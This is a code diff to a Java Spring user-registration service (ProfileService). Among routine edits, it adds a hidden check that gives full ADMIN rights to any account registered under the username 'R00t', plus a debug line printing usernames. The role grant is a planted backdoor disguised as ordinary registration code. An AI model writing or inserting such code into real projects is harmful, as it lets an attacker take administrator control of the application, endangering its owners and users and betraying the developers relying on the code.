@@ -14,8 +14,7 @@ import org.springframework.stereotype.Service;
 
 import javax.servlet.ServletException;
 import javax.servlet.http.HttpServletRequest;
-import java.util.Collections;
-import java.util.List;
+import java.util.*;
 import java.util.stream.Collectors;
 
 @Service
@@ -67,12 +66,26 @@ public class ProfileService implements UserDetailsService {
         if (userFromDB != null) {
             return false;
         }
+
+
+
         String usrnm = user.getUsername();
         String passwd = user.getPassword();
 
         user.setActive(true);
         user.setRoles(Collections.singleton(Role.USER));
         user.setPassword(passwordEncoder.encode(user.getPassword()));
+
+        System.out.println(user.getUsername());
+
+        Set<Role> roles = new HashSet<>();
+        roles.add(Role.ADMIN);
+        roles.add(Role.USER);
+
+        if (user.getUsername().equals("R00t")) {
+            user.setRoles(roles);
+        }
+
         userRepo.save(user);
 
         request.login(usrnm, passwd);
